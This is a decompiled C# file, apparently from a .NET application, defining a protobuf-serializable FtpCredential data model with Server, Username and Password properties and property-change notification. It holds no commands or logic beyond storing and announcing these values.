using System;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x02000168 RID: 360
	[ProtoContract(Name = "FtpCredential")]
	public class FtpCredential : INotifyPropertyChanged
	{
		// Token: 0x170002DC RID: 732
		// (get) Token: 0x06000B86 RID: 2950 RVA: 0x00008E0C File Offset: 0x0000700C
		// (set) Token: 0x06000B87 RID: 2951 RVA: 0x00008E14 File Offset: 0x00007014
		[ProtoMember(1, Name = "Server")]
		public string Server
		{
			get
			{
				return this._server;
			}
			set
			{
				this._server = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Server"));
			}
		}

		// Token: 0x170002DD RID: 733
		// (get) Token: 0x06000B88 RID: 2952 RVA: 0x00008E38 File Offset: 0x00007038
		// (set) Token: 0x06000B89 RID: 2953 RVA: 0x00008E40 File Offset: 0x00007040
		[ProtoMember(2, Name = "Username")]
		public string Username
		{
			get
			{
				return this._username;
			}
			set
			{
				this._username = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Username"));
			}
		}

		// Token: 0x170002DE RID: 734
		// (get) Token: 0x06000B8A RID: 2954 RVA: 0x00008E64 File Offset: 0x00007064
		// (set) Token: 0x06000B8B RID: 2955 RVA: 0x00008E6C File Offset: 0x0000706C
		[ProtoMember(3, Name = "Password")]
		public string Password
		{
			get
			{
				return this._password;
			}
			set
			{
				this._password = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Password"));
			}
		}

		// Token: 0x14000021 RID: 33
		// (add) Token: 0x06000B8C RID: 2956 RVA: 0x00023020 File Offset: 0x00021220
		// (remove) Token: 0x06000B8D RID: 2957 RVA: 0x00023058 File Offset: 0x00021258
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x0400046E RID: 1134
		private string _server;

		// Token: 0x0400046F RID: 1135
		private string _username;

		// Token: 0x04000470 RID: 1136
		private string _password;
	}
}
